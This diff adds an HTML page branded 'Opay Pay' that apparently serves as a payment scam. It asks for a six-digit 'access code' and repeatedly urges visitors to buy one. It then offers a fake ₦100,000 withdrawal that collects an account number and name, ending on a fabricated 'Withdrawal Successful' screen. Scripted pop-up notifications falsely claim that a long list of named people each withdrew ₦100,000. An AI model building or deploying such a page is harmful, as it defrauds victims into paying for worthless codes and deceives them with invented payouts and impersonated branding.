@@ -1,1 +1,922 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Opay Pay</title>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <style>
+        /* Basic styles */
+        body {
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background: linear-gradient(to bottom right, #38A169, #1C7B47);
+            color: white;
+            /* Allow scrolling on the body */
+            overflow-y: auto; /* Changed to auto to allow vertical scrolling */
+            overflow-x: hidden; /* Prevent horizontal scrolling */
+        }
 
+        .container {
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            position: relative;
+            z-index: 1;
+            margin: 20px 0; /* Add margin for scrollability */
+        }
+
+        .logo-container {
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background-color: white;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            border: 5px solid #00C853;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+        }
+
+        .logo-inner-ring {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            border: 5px solid #00BFA5;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            margin-top: 5px;
+            margin-bottom: 10px;
+        }
+
+        h2 {
+            margin-bottom: 5px;
+            font-size: 1.5em;
+        }
+
+        p {
+            margin-bottom: 20px;
+            font-size: 0.9em;
+            color: #ccc;
+        }
+
+        .access-code-input {
+            width: calc(100% - 40px);
+            padding: 15px 20px;
+            margin-bottom: 30px;
+            border: none;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 1.2em;
+            background-color: rgba(255, 255, 255, 0.9);
+            color: #333;
+            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.2);
+            outline: none;
+        }
+
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .keypad button {
+            background-color: white;
+            color: #333;
+            border: none;
+            border-radius: 10px;
+            padding: 20px 0;
+            font-size: 1.5em;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            transition: background-color 0.2s ease;
+        }
+
+        .keypad button:hover {
+            background-color: #f0f0f0;
+        }
+
+        .keypad button.clear {
+            background-color: #E53935;
+            color: white;
+        }
+        .keypad button.clear:hover {
+            background-color: #C62828;
+        }
+
+        .keypad button.enter {
+            background-color: #4CAF50;
+            color: white;
+        }
+        .keypad button.enter:hover {
+            background-color: #388E3C;
+        }
+
+        .buy-button {
+            background: linear-gradient(to right, #FF9800, #FF5722);
+            color: white;
+            border: none;
+            border-radius: 25px;
+            padding: 15px 40px;
+            font-size: 1.1em;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+            transition: opacity 0.2s ease;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        .buy-button:hover {
+            opacity: 0.9;
+        }
+
+        .referral-text {
+            font-size: 0.85em;
+            color: #ccc;
+        }
+
+        .refresh-link {
+            display: block;
+            margin-top: 15px;
+            font-size: 0.9em;
+            color: #ADD8E6;
+            text-decoration: underline;
+            cursor: pointer;
+            transition: color 0.2s ease;
+        }
+
+        .refresh-link:hover {
+            color: #87CEEB;
+        }
+
+        /* Styles for the Withdrawal Page */
+        .withdrawal-container {
+            display: none; /* Keep hidden initially */
+            font-family: Arial, sans-serif;
+            background-color: #006400;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+            position: fixed; /* Keep fixed to cover the screen when active */
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 100;
+            overflow-y: auto; /* Allow scrolling within the withdrawal container if content is too tall */
+        }
+
+        .withdrawal-form-container {
+            background-color: #FFFFFF;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 450px;
+            box-sizing: border-box;
+            margin: auto; /* Center the form in the fixed container */
+        }
+
+        .withdrawal-form-container h2 {
+            text-align: center;
+            color: #333333;
+            margin-bottom: 30px;
+            font-size: 28px;
+        }
+
+        .withdrawal-form-group {
+            margin-bottom: 25px;
+        }
+
+        .withdrawal-form-container label {
+            display: block;
+            margin-bottom: 10px;
+            color: #555555;
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        .withdrawal-form-container input[type="text"],
+        .withdrawal-form-container input[type="number"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #DDDDDD;
+            border-radius: 6px;
+            font-size: 16px;
+            background-color: #FFFFFF;
+            box-sizing: border-box;
+            color: #333333;
+        }
+
+        .amount-display {
+            background-color: #F0F0F0;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            color: #006400;
+            text-align: center;
+            border: 1px solid #CCCCCC;
+        }
+
+        .withdrawal-form-container input[type="submit"] {
+            background-color: #006400;
+            color: white;
+            padding: 15px 25px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 18px;
+            width: 100%;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            font-weight: bold;
+        }
+
+        .withdrawal-form-container input[type="submit"]:hover {
+            background-color: #004D00;
+            transform: translateY(-2px);
+        }
+
+        .withdrawal-form-container input[type="submit"]:active {
+            transform: translateY(0);
+        }
+
+        /* Incorrect Code Pop-up Styles */
+        .hip-hop-popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .hip-hop-popup-content {
+            background-color: #333;
+            color: white;
+            padding: 30px;
+            border-radius: 15px;
+            text-align: center;
+            max-width: 350px;
+            width: 90%;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
+            position: relative;
+            animation: bounceIn 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+            border: 3px solid #FFD700;
+        }
+
+        .hip-hop-popup-content h3 {
+            font-family: 'Impact', sans-serif;
+            font-size: 2.2em;
+            color: #FFD700;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
+        }
+
+        .hip-hop-popup-content p {
+            font-size: 1.1em;
+            margin-bottom: 25px;
+            color: #eee;
+        }
+
+        .popup-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .popup-buttons button {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 25px;
+            font-size: 1.0em;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            font-weight: bold;
+        }
+
+        .popup-buttons .buy-code-btn {
+            background-color: #00C853;
+            color: white;
+        }
+        .popup-buttons .buy-code-btn:hover {
+            background-color: #00A140;
+            transform: translateY(-2px);
+        }
+
+        .popup-buttons .contact-us-btn {
+            background-color: #03A9F4;
+            color: white;
+        }
+        .popup-buttons .contact-us-btn:hover {
+            background-color: #0288D1;
+            transform: translateY(-2px);
+        }
+
+        .cancel-icon {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            font-size: 1.8em;
+            color: white;
+            cursor: pointer;
+            z-index: 10;
+            transition: transform 0.2s ease;
+        }
+
+        .cancel-icon:hover {
+            transform: scale(1.1);
+        }
+
+        @keyframes bounceIn {
+            0% {
+                transform: scale(0.3);
+                opacity: 0;
+            }
+            50% {
+                transform: scale(1.05);
+                opacity: 1;
+            }
+            70% {
+                transform: scale(0.9);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        /* --- Styles for Login Loading and Success --- */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            justify-content: center;
+            align-items: center;
+            z-index: 1001;
+        }
+
+        .spinner {
+            border: 8px solid rgba(255, 255, 255, 0.3);
+            border-top: 8px solid #00C853;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .login-success-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            justify-content: center;
+            align-items: center;
+            z-index: 1002;
+        }
+
+        .login-success-content {
+            background-color: #fff;
+            color: #333;
+            padding: 40px;
+            border-radius: 15px;
+            text-align: center;
+            max-width: 300px;
+            width: 90%;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.4);
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .login-success-content .icon {
+            font-size: 4em;
+            color: #00C853;
+            margin-bottom: 20px;
+        }
+
+        .login-success-content h3 {
+            font-size: 1.8em;
+            margin-bottom: 10px;
+            color: #00C853;
+        }
+
+        .login-success-content p {
+            font-size: 1.1em;
+            color: #555;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        /* --- New Styles for Withdrawal Success (Modified to match second code) --- */
+        .withdrawal-success-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #f0f2f5; /* Background from second code */
+            justify-content: center;
+            align-items: center;
+            z-index: 1003;
+            padding: 0; /* No padding on overlay itself */
+            box-sizing: border-box;
+        }
+
+        .withdrawal-success-content {
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); /* Enhanced shadow */
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            padding: 30px 20px;
+            box-sizing: border-box;
+            animation: fadeIn 0.5s ease-out; /* Keeping a smooth transition */
+        }
+
+        .withdrawal-success-content .icon-wrapper { /* New wrapper for icon */
+            width: 80px;
+            height: 80px;
+            background-color: #4CAF50;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 25px; /* Centered with margin */
+            color: #fff;
+            font-size: 48px;
+        }
+
+        .withdrawal-success-content .icon-wrapper .material-icons {
+            font-size: 48px; /* Ensure icon size is correct */
+        }
+
+        .withdrawal-success-content .status-text { /* New class for the main status */
+            font-size: 24px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .withdrawal-success-content .amount-received { /* New class for the amount */
+            font-size: 36px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 25px;
+        }
+
+        .withdrawal-success-content .message { /* New class for the description */
+            font-size: 14px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 40px;
+        }
+
+        .withdrawal-success-content .button-group { /* Group for buttons */
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .withdrawal-success-content .button { /* General button style for success popup */
+            padding: 15px 20px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            box-sizing: border-box;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+        }
+
+        .withdrawal-success-content .button.get-receipt {
+            background-color: #e0e0e0;
+            color: #757575;
+        }
+
+        .withdrawal-success-content .button.okay {
+            background-color: #5cb85c;
+            color: #fff;
+        }
+
+        .withdrawal-success-content .button:hover {
+            transform: translateY(-2px);
+        }
+
+        .withdrawal-success-content .button.get-receipt:hover {
+            background-color: #d0d0d0;
+        }
+
+        .withdrawal-success-content .button.okay:hover {
+            background-color: #4CAF50;
+        }
+
+        /* --- Toast Notification Styles --- */
+        .toast-notification {
+            position: fixed;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%) translateY(-100%);
+            background-color: white;
+            color: black;
+            padding: 15px 20px;
+            border-bottom-left-radius: 8px;
+            border-bottom-right-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            font-size: 0.95em;
+            z-index: 2000;
+            opacity: 0;
+            transition: transform 0.5s ease-out, opacity 0.5s ease-out;
+            min-width: 250px;
+            text-align: center;
+        }
+
+        .toast-notification.show {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1;
+        }
+
+        .toast-notification .toast-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 5px;
+        }
+
+        .toast-notification .toast-app-name {
+            font-weight: bold;
+            color: #00C853;
+            font-size: 0.8em;
+        }
+
+        .toast-notification .toast-time {
+            font-size: 0.75em;
+            color: #555;
+        }
+
+        .toast-notification .toast-message {
+            font-size: 1em;
+            line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="firstPage">
+        <div class="logo-container">
+            <div class="logo">
+                <div class="logo-inner-ring"></div>
+            </div>
+        </div>
+
+        <h2>Welcome To</h2>
+        <h1>Opay Pay</h1>
+        <p>Enter (6) digit Access Code</p>
+
+        <input type="text" class="access-code-input" placeholder=" " maxlength="6">
+
+        <div class="keypad">
+            <button>1</button>
+            <button>2</button>
+            <button>3</button>
+            <button>4</button>
+            <button>5</button>
+            <button>6</button>
+            <button>7</button>
+            <button>8</button>
+            <button>9</button>
+            <button class="clear">Clear</button>
+            <button>0</button>
+            <button class="enter">Enter</button>
+        </div>
+
+        <button class="buy-button" id="buyAccessCodeMain">Buy Access Code</button>
+
+        <p class="referral-text">Earn by referral code</p>
+
+        <a href="#" class="refresh-link" id="refreshApp">Refresh App</a>
+    </div>
+
+    <div class="withdrawal-container" id="secondPage">
+        <div class="withdrawal-form-container">
+            <h2>Fund Opay Wallet</h2>
+            <form id="withdrawalForm" action="/process_opay_withdrawal" method="POST">
+                <div class="withdrawal-form-group">
+                    <label for="display_amount">Withdrawal Amount:</label>
+                    <div class="amount-display" id="display_amount">₦100,000.00</div>
+                </div>
+
+                <input type="hidden" id="withdrawal_amount" name="withdrawal_amount" value="100000.00">
+
+                <div class="withdrawal-form-group">
+                    <label for="opay_account_number">Opay Account Number:</label>
+                    <input type="text" id="opay_account_number" name="opay_account_number" placeholder="Enter your Opay Account Number" required>
+                </div>
+
+                <div class="withdrawal-form-group">
+                    <label for="opay_account_name">Opay Account Name:</label>
+                    <input type="text" id="opay_account_name" name="opay_account_name" placeholder="Enter your Opay Account Name" required>
+                </div>
+
+                <input type="submit" value="Withdrawal">
+            </form>
+        </div>
+    </div>
+
+    <div class="hip-hop-popup-overlay" id="incorrectCodePopup">
+        <div class="hip-hop-popup-content">
+            <div class="cancel-icon" id="closePopup">&times;</div>
+            <h3>Incorrect Access Code</h3>
+            <p>The access code you entered is incorrect. Please click the button below to buy a valid access code</p>
+            <div class="popup-buttons">
+                <button class="buy-code-btn" id="buyCodePopup">Buy Code</button>
+                <button class="contact-us-btn" id="contactUsPopup">Contact Us</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+    </div>
+
+    <div class="login-success-overlay" id="loginSuccessOverlay">
+        <div class="login-success-content">
+            <div class="icon">&#10004;</div> <h3>Login Successful!</h3>
+            <p>Good job! Redirecting you now...</p>
+        </div>
+    </div>
+
+    <div class="withdrawal-success-overlay" id="withdrawalSuccessOverlay">
+        <div class="withdrawal-success-content">
+            <div class="icon-wrapper">
+                <i class="material-icons">check</i>
+            </div>
+            <div class="status-text">Withdrawal Successful</div>
+            <div class="amount-received" id="successfulWithdrawalAmount">₦100,000.00</div>
+            <div class="message">
+                The recipient account is expected to be credited within 5 minutes, subject to notification by the bank.
+            </div>
+            <div class="button-group">
+                <button class="button get-receipt">Get Receipt</button>
+                <button class="button okay" id="withdrawalOkButton">Okay</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="toast-notification" id="toastNotification">
+        <div class="toast-header">
+            <span class="toast-app-name">Opay</span>
+            <span class="toast-time" id="toastTime"></span>
+        </div>
+        <div class="toast-message" id="toastMessage"></div>
+    </div>
+
+    <script>
+        const accessCodeInput = document.querySelector('.access-code-input');
+        const keypadButtons = document.querySelectorAll('.keypad button');
+        const firstPage = document.getElementById('firstPage');
+        const secondPage = document.getElementById('secondPage');
+        const incorrectCodePopup = document.getElementById('incorrectCodePopup');
+        const closePopupBtn = document.getElementById('closePopup');
+        const buyCodePopupBtn = document.getElementById('buyCodePopup');
+        const contactUsPopupBtn = document.getElementById('contactUsPopup');
+        const buyAccessCodeMainBtn = document.getElementById('buyAccessCodeMain');
+        const refreshAppLink = document.getElementById('refreshApp');
+
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const loginSuccessOverlay = document.getElementById('loginSuccessOverlay');
+
+        const withdrawalForm = document.getElementById('withdrawalForm');
+        const withdrawalSuccessOverlay = document.getElementById('withdrawalSuccessOverlay');
+        const withdrawalOkButton = document.getElementById('withdrawalOkButton'); // Changed from original
+        const successfulWithdrawalAmount = document.getElementById('successfulWithdrawalAmount'); // New element
+
+        const toastNotification = document.getElementById('toastNotification');
+        const toastTime = document.getElementById('toastTime');
+        const toastMessage = document.getElementById('toastMessage');
+
+        const correctCode = "351710";
+        const names = [
+            'Adewale', 'Chiamaka', 'Ibrahim', 'Oluwaseun', 'Emeka', 'Zainab', 'Tunde', 'Ifeoma', 'Musa', 'Yetunde',
+            'Uche', 'Nneka', 'Bashir', 'Temitope', 'Ebuka', 'Aisha', 'Kunle', 'Adaeze', 'Sulaiman', 'Morenike',
+            'Obinna', 'Kemi', 'Aminu', 'Chioma', 'Dapo', 'Ngozi', 'Farouk', 'Ronke', 'Chinedu', 'Halima',
+            'Babajide', 'Amarachi', 'Kabir', 'Omotola', 'Nnamdi', 'Bisi', 'Gambo', 'Uzoamaka', 'Femi', 'Titilayo',
+            'Yakubu', 'Oluchi', 'Tobi', 'Onyinye', 'Idris', 'Abimbola', 'Eze', 'Jumoke', 'Haruna', 'Ogechi',
+            'Ayoola', 'Chisom', 'Abdulahi', 'Funke', 'Chuka', 'Rukayat', 'Segun', 'Nkiru', 'Bello', 'Ijeoma',
+            'Adebayo', 'Olamide', 'Nura', 'Blessing', 'Olatunde', 'Ezinne', 'Abdullahi', 'Sade', 'Ebunoluwa', 'Chigozie',
+            'Hassan', 'Kehinde', 'Okechukwu', 'Modupe', 'Sheriff', 'Anurika', 'Ismail', 'Ayomide', 'Onyeka', 'Bose',
+            'Lukman', 'Tope', 'Chukwudi', 'Aramide', 'Shehu', 'Adanna', 'Kolade', 'Nneoma', 'Rabiu', 'Adedayo',
+            'Kelechi', 'Zubaida', 'Akin', 'Mmesoma', 'Dauda', 'Tosin', 'Ikenna', 'Fadeke', 'Lanre', 'Chinyere'
+        ];
+
+        let currentNameIndex = 0;
+        let isToastShowing = false;
+
+        function showIncorrectCodePopup() {
+            incorrectCodePopup.style.display = 'flex';
+        }
+        function hideIncorrectCodePopup() {
+            incorrectCodePopup.style.display = 'none';
+        }
+
+        function showLoadingOverlay() {
+            loadingOverlay.style.display = 'flex';
+        }
+        function hideLoadingOverlay() {
+            loadingOverlay.style.display = 'none';
+        }
+        function showLoginSuccessOverlay() {
+            loginSuccessOverlay.style.display = 'flex';
+        }
+        function hideLoginSuccessOverlay() {
+            loginSuccessOverlay.style.display = 'none';
+        }
+
+        function showWithdrawalSuccessOverlay() {
+            withdrawalSuccessOverlay.style.display = 'flex';
+        }
+        function hideWithdrawalSuccessOverlay() {
+            withdrawalSuccessOverlay.style.display = 'none';
+        }
+
+        function showToast(message, time) {
+            if (isToastShowing) {
+                return;
+            }
+            isToastShowing = true;
+
+            toastMessage.textContent = message;
+            toastTime.textContent = time;
+            toastNotification.classList.add('show');
+
+            setTimeout(() => {
+                toastNotification.classList.remove('show');
+                setTimeout(() => {
+                    isToastShowing = false;
+                    displayNextToastWithDelay();
+                }, 500);
+            }, 4000);
+        }
+
+        function generateWithdrawalMessage(name) {
+            const fixedAmount = "100,000.00";
+            
+            const now = new Date();
+            const hours = now.getHours();
+            const minutes = now.getMinutes();
+            const timeString = `${hours % 12 || 12}:${minutes < 10 ? '0' : ''}${minutes} ${hours >= 12 ? 'PM' : 'AM'}`;
+
+            return {
+                name: name,
+                amount: fixedAmount,
+                time: timeString
+            };
+        }
+
+        function displayNextToast() {
+            const name = names[currentNameIndex];
+            const withdrawalInfo = generateWithdrawalMessage(name);
+            const message = `${withdrawalInfo.name} withdrew ₦${withdrawalInfo.amount}`;
+            showToast(message, withdrawalInfo.time);
+
+            currentNameIndex = (currentNameIndex + 1) % names.length;
+        }
+
+        function displayNextToastWithDelay() {
+            setTimeout(() => {
+                displayNextToast();
+            }, 1500);
+        }
+
+        // Keypad button event listeners
+        keypadButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                const buttonText = button.textContent;
+
+                if (button.classList.contains('clear')) {
+                    accessCodeInput.value = '';
+                } else if (button.classList.contains('enter')) {
+                    if (accessCodeInput.value === correctCode) {
+                        showLoadingOverlay();
+                        setTimeout(() => {
+                            hideLoadingOverlay();
+                            showLoginSuccessOverlay();
+                            setTimeout(() => {
+                                hideLoginSuccessOverlay();
+                                firstPage.style.display = 'none';
+                                secondPage.style.display = 'flex';
+                                accessCodeInput.value = '';
+                            }, 1500);
+                        }, 2000);
+                    } else {
+                        showIncorrectCodePopup();
+                        accessCodeInput.value = '';
+                    }
+                } else {
+                    if (accessCodeInput.value.length < accessCodeInput.maxLength) {
+                        accessCodeInput.value += buttonText;
+                    }
+                }
+            });
+        });
+
+        // Pop-up button event listeners
+        closePopupBtn.addEventListener('click', hideIncorrectCodePopup);
+        buyCodePopupBtn.addEventListener('click', () => {
+            // This is the primary action for buying code when incorrect code popup is shown
+            alert('Redirecting to Buy Code page...');
+            hideIncorrectCodePopup();
+        });
+        contactUsPopupBtn.addEventListener('click', () => {
+            alert('Redirecting to Contact Us page...');
+            hideIncorrectCodePopup();
+        });
+
+        // Main page "Buy Access Code" button - This is always visible and clickable
+        buyAccessCodeMainBtn.addEventListener('click', () => {
+            alert('Redirecting to Buy Access Code page...');
+            // No need to hide anything, as this button is on the main visible page.
+        });
+
+        // Refresh App link event listener
+        refreshAppLink.addEventListener('click', (event) => {
+            event.preventDefault();
+            location.reload();
+        });
+
+        // Withdrawal Form Submission Logic
+        withdrawalForm.addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const opayAccountNumber = document.getElementById('opay_account_number').value;
+            const opayAccountName = document.getElementById('opay_account_name').value;
+            const withdrawalAmount = document.getElementById('display_amount').textContent; // Get the displayed amount
+
+            if (opayAccountNumber.trim() === '' || opayAccountName.trim() === '') {
+                alert('Please fill in all withdrawal details.');
+                return;
+            }
+
+            showLoadingOverlay();
+            setTimeout(() => {
+                hideLoadingOverlay();
+                // Set the amount in the success overlay
+                successfulWithdrawalAmount.textContent = withdrawalAmount;
+                showWithdrawalSuccessOverlay();
+
+                document.getElementById('opay_account_number').value = '';
+                document.getElementById('opay_account_name').value = '';
+            }, 2500);
+        });
+
+        // Event listener for the "Okay" button on the withdrawal success popup
+        withdrawalOkButton.addEventListener('click', () => {
+            hideWithdrawalSuccessOverlay();
+            // Optionally, you might want to redirect back to the first page or a dashboard here
+            // firstPage.style.display = 'flex';
+            // secondPage.style.display = 'none';
+        });
+
+        // Start toast notification sequence on app load
+        window.addEventListener('DOMContentLoaded', () => {
+            displayNextToast();
+        });
+
+    </script>
+</body>
+</html>
